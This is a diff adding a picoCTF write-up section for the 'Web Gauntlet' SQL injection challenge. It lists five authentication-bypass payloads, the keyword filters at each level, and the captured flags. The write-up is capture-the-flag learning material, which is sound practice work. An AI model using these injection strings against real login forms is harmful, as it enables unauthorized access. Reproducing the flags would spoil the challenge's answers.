@@ -526,3 +526,35 @@ Since we know where this file is in the directory, all we have to do is traverse
 <img width="651" height="134" alt="image" src="https://github.com/user-attachments/assets/663f7f61-6d04-4216-8a84-48ca7b607bee" />
 
 **Flag:** picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
+
+## Web Gauntlet 
+
+**Categories:** SQLi
+
+I'm too lazy to take a screenshot of each and every page again, so I'll just list the payloads and filters here:
+
+**Payload:**
+
+```
+1. admin' --
+2. admin';
+3. admin';
+4. ad'||'min';
+5. ad'||'min';
+```
+
+I'm sure there were more relevant payloads but oh well.
+
+**Filter:**
+
+```
+1. or
+2. or and like = --
+3. or and like > < = --
+4. or and like > < = -- admin
+5. or and like > < = -- admin union
+```
+
+<img width="1232" height="730" alt="image" src="https://github.com/user-attachments/assets/08ce2361-ab56-4b8c-b550-b6ba612b5fca" />
+
+**Flag:** picoCTF{y0u_m4d3_1t_79a0ddc6}
